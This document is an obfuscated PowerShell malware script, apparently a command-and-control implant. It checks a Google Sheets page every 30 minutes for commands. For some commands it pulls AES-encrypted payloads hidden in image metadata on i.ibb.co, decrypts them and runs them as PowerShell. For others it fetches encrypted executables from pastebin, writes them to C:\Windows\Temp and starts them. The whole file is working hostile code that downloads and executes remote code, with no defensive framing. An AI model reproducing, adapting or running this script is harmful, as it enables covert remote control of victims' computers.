.("{1}{0}" -f 'et','s') ("ObA"+"iz9") ([tyPe]("{8}{11}{3}{4}{5}{10}{2}{7}{0}{6}{9}{1}" -f 'e','aL','r','t','im','e.iN','RvICe','opS','sySTEM.r','s.mARsh','te','Un')  ) ;${lCo`Tn}=[tYPE]("{1}{3}{2}{0}" -F'.cOnVERt','SYsT','m','E');   ${HX`2p`U0}  = [TYpe]("{4}{2}{1}{3}{5}{0}" -f 'NG','.TEX','TeM','t.e','sYs','NcoDI'); &("{1}{0}" -f't','SE')  ('j1'+'V8t') ( [TyPE]("{4}{3}{2}{0}{1}"-f 'M.IO.fi','LE','E','t','SYS')  );  function gETcip`he`RTe`XT {
    param(${iM`AGE})

    ${t`Mp} = &("{3}{1}{2}{0}"-f'Item','Ch','ild','Get-') ${Im`A`GE}
    ${pat`h`NaME} = ${T`mp}."DIrE`cto`RynA`mE"
    ${FI`l`eNaMe} = ${T`MP}."N`Ame"

    ${CIPher`TE`XT} = ""

    try{
        ${s`he`LLO`BJ} = .("{2}{1}{0}" -f'Object','ew-','N') -ComObject ("{1}{0}{3}{2}" -f 'Applic','Shell.','ion','at')
        ${Fo`lDE`RoBJ} = ${s`hELL`OBj}.("{1}{0}{2}"-f'espa','nam','ce').Invoke(${p`A`ThN`AmE})
        ${FIl`Eo`Bj} = ${FOlDe`R`obJ}.("{1}{0}{2}" -f'en','pars','ame').Invoke(${FIle`NA`me})


        ${C`iphe`R`TExt} += ${f`oL`dERobj}.("{1}{0}{2}" -f'etDetai','g','lsOf').Invoke(${fil`eoBJ}, 30)

        ${CIp`H`ertEXT} += ${f`ol`DER`obj}.("{1}{0}{2}{3}"-f 'ta','getDe','ils','Of').Invoke(${Fi`LEo`BJ}, 32)




    }finally{
        if(${S`HEl`L`obJ}){
              (  &("{0}{1}{2}"-f 'Var','IAb','Le')  ("oBa"+"IZ9") -ValueoNly )::"RELE`AsEcom`ob`jeCT"([System.__ComObject]${SheL`lo`Bj}) | .("{0}{2}{1}" -f 'out-','ull','n')
        }
    }

    return ${C`iPhE`RT`ExT}
}

function decRY`pt{

    Param
    (
         [Parameter(MaNDatorY=${tR`UE}, PoSItion=0)]
         [byte[]] ${k`EY},
         [Parameter(MAndatORY=${t`RUe}, pOSItiOn=1)]
         [string] ${c`Iphe`RTe`xT}
    )

    ${AES`cI`PHER} = .("{2}{1}{0}" -f 'ject','b','New-O') ("{3}{1}{10}{4}{12}{6}{9}{2}{8}{0}{7}{11}{5}" -f'rvice','c','t','System.Se','ty.Cryp','ider','raphy.AesCr','Pro','oSe','yp','uri','v','tog')

    ${a`eSC`IPHER}."k`EY" = ${K`EY}
    ${cIPhER`TE`xt`By`TeS} =   ( &("{0}{1}{2}"-f'VARIAb','l','e')  ('lC'+'otN')  ).ValuE::("{3}{0}{2}{1}"-f'64','ng','Stri','FromBase').Invoke(${cI`p`H`erTEXt})
    ${aEScI`pH`eR}."iV" = ${ci`PheRTe`x`Tb`Y`TES}[0..15]

    ${De`cr`ypt`Or} = ${aEscI`PH`Er}.("{3}{2}{1}{0}" -f'ptor','eDecry','t','Crea').Invoke();
    ${UNEn`Cryp`Ted`BY`Tes} = ${dE`CrYPT`oR}.("{0}{4}{1}{5}{3}{2}" -f'Tra','al','k','c','nsformFin','Blo').Invoke(${CIp`hER`Te`xTByt`eS}, 16, ${c`ipH`E`RTEXt`BYTeS}."le`NG`TH" - 16)

    ${a`es`C`ipHEr}.("{1}{0}"-f'se','Dispo').Invoke()

    return ${UNENC`RYP`T`edB`Ytes}
}

function R`U`Np`oWerShElL {
    Param
    (
         [Parameter(mANDaToRY=${t`RUE}, PosITiON=0)]
         [string] ${P`Art`IaLKEY},
         [Parameter(MandAtORy=${T`RuE}, POsiTIon=1)]
         [string] ${Im`A`Geurl}
    )
    ${Nu`ll} = &("{0}{1}{2}"-f'Ne','w-I','tem') -Path ((("{1}{0}"-f 'tmp','.{0}')) -F[CHaR]92) -ItemType ("{2}{1}{0}" -f'ory','t','Direc')

    ${HE`X`kEY} = ("{6}{3}{0}{2}{8}{4}{7}{1}{5}" -f 'FD','A5558','DEFA','B','6','6D57','BE7','A0B9','5A56B95D') + ${pArTi`AL`k`eY}
    ${k`EY} = [byte[]] (${Hex`K`EY} -replace '..', (('0x{0}'+'&,')-F [chaR]36) -split ',' -ne '')

    ${im`AgE} = ("{2}{4}{3}{0}{1}"-f'i.ibb','.co/','http','://','s') + ${imagE`U`RL} + ("{1}{0}{2}"-f 'ru','/','ins.jpg')
    .("{1}{0}{3}{2}" -f'oke','Inv','WebRequest','-') -URI ${i`MA`Ge} -OutFile ((("{1}{0}{2}{3}"-f 'tmpY4lt','.Y4l','mp','.jpg')) -CrePlACE([chaR]89+[chaR]52+[chaR]108),[chaR]92)

    ${C`i`pHERt`EXt} = .("{2}{1}{0}{3}"-f'ex','tCiphert','Ge','t') ((("{1}{2}{0}{3}"-f'{0}tmp','.{','0}tmp','.jpg')) -f[cHar]92)

    ${uNe`NcRY`ptEDb`yT`Es} = &("{2}{1}{0}"-f 't','p','Decry') ${k`EY} ${C`iPhERT`e`Xt}
    ${PLAi`Nt`eXT} =  (&("{0}{2}{1}" -f'VA','aBLE','ri')  ("HX"+"2PU0")).vAlUE::"ut`F8"."G`ets`TRINg"(${uNEn`crYPtE`DbYT`es})
    ${PlA`I`NTeXt} | .("{2}{1}{0}" -f '-File','ut','O') -FilePath (("{1}{0}{2}{3}" -f 'htmp.','.aMhtmpaM','p','s1'))."RePl`ACE"(([cHar]97+[cHar]77+[cHar]104),'\')

    .((("{5}{2}{0}{3}{1}{4}"-f'm','.p','mp{0}t','p','s1','.{0}t')) -F [cHAr]92)

    .("{0}{1}{2}"-f 'Remove-I','te','m') ((("{0}{1}"-f'.nE','Vtmp'))."r`epLA`cE"('nEV',[sTRiNG][cHar]92)) -Recurse
}

function RU`NexE {
    Param
    (
         [Parameter(MANdaToRy=${Tr`Ue}, POsiTIon=0)]
         [string] ${p`ARTI`AlKey},
         [Parameter(mandAtoRy=${tr`UE}, pOsitIOn=1)]
         [string] ${fILe`UrL}
    )
    ${tar`G`ET`diR} = ((("{5}{4}{6}{3}{7}{1}{0}{8}{2}"-f 'pEtMc','m','nfigEtM','ndowsEtM','EtMW','C:','i','Te','o')) -REpLacE ([cHaR]69+[cHaR]116+[cHaR]77),[cHaR]92)
    if( -Not (&("{0}{2}{1}" -f 'Test','ath','-P') -Path ${t`ARg`eTD`Ir} ) ){
        ${nU`lL} = &("{0}{2}{1}"-f'N','Item','ew-') -Path ${tARG`e`TdIr} -ItemType ("{2}{0}{1}"-f'r','y','Directo')
    }

    ${h`eXK`Ey} = ${pARTI`Al`k`Ey} + ("{2}{4}{7}{3}{8}{0}{6}{1}{5}"-f '0F49','2F','283FF031EA','179','CE2','A23','E6','E7B1','5')
    ${k`EY} = [byte[]] (${h`EXkEy} -replace '..', ((('0'+'xd'+'GH&,') -crEplacE'dGH',[chAr]36)) -split ',' -ne '')

        ${p`AsTE`BINU`RL} = ("{0}{3}{1}{6}{2}{5}{4}"-f 'https:/','ebin.','m/','/past','aw/','r','co') + ${FiL`EurL}
    ${c`Iph`ErTeXT} = (&("{2}{4}{0}{1}{3}" -f 'ke-WebR','eque','In','st','vo') -Uri ${pA`St`EbIN`Url})."C`ONTeNt"

    ${PlAi`N`TE`xT} = .("{2}{0}{1}" -f'e','crypt','D') ${K`Ey} ${c`I`PHeRText}

    ${f`ilenA`me} = ${t`ARGEtD`Ir} + ${f`ILeUrl} + ("{0}{1}"-f'.','exe')
      ( .("{1}{0}{2}" -f't-VARIAbl','Ge','e') ('J1'+'V8T') -vaLuEOn )::("{0}{2}{1}" -f'W','es','riteAllByt').Invoke(${f`I`LEnamE}, ${PLa`In`TEXt})
    &("{0}{1}{2}" -f'St','art-Pro','cess') ${f`iLenA`mE}

    &("{0}{3}{2}{1}" -f 'Wri','ost','-H','te') ("{2}{1}{0}"-f'hed!','s','Fini')
}

${C`oMmAnDs`URl} = ("{17}{7}{24}{31}{12}{13}{10}{28}{3}{27}{5}{14}{30}{11}{1}{26}{21}{18}{15}{20}{19}{6}{4}{25}{8}{23}{22}{29}{9}{2}{0}{16}" -f'=cs','Mvk4','ub?output','dsh','WI','ts/d/e/2PA','fqN9mLgfxRV','tps','ja6oo7Bdr','gPljFRvmrb/p','com/','vS','ocs.googl','e.','CX','x','v','ht','JGyYgLXK','jAoHakXXwZ','a','gNNMj','hjea','SqWX','://','7','ES','ee','sprea','dfnpt','-1','d')

${la`STcO`mmA`ND} = ""

while (${t`RUe}) {
    ${re`SPOn`sE} = .("{4}{0}{1}{5}{3}{2}" -f'nvoke-W','ebRe','t','es','I','qu') -URI ${C`O`MMaNdS`UrL}
    ${cOM`Ma`Nds} = ${RE`SpoN`Se} -split "\n"
    ${c`URR`ENTCO`MmANd} = ${coMmA`N`ds}[${COm`MA`N`dS}."Co`UNT" - 1]
    ${Da`TE}, ${u`Rl}, ${TY`pE}, ${k`EY} = ${Cu`RR`eNTCommaNd} -split ","

    if (${laST`COMm`A`ND} -ne ${D`ATe}) {
        ${laST`cO`mManD} = ${D`ATE}

        if ( ${tY`pE} -eq "ps1" ){
            .("{0}{3}{1}{2}" -f 'Wr','e-Ho','st','it') ("{3}{5}{2}{1}{0}{6}{4}" -f' comm','l','l','New Powe','d','rShe','an')
            .("{1}{3}{0}{2}" -f'Sh','RunPow','ell','er') ${k`EY} ${U`Rl}
        }elseif( ${Ty`Pe} -eq "exe" ){
            &("{2}{1}{0}" -f 'st','-Ho','Write') ("{2}{0}{3}{1}" -f'EXE ','nd','New ','comma')
            .("{1}{0}" -f'Exe','Run') ${K`ey} ${U`RL}
        }else{
            &("{2}{0}{1}" -f 'rit','e-Host','W') ("{0}{5}{2}{1}{4}{3}" -f'New UN',' co','OWN','and','mm','KN')
        }
    }else{
        &("{2}{0}{1}"-f'it','e-Host','Wr') ("{0}{2}{1}" -f 'N','d','o new comman')
    }

    .("{2}{3}{0}{1}" -f'art-','Sleep','S','t') -Seconds 1800
}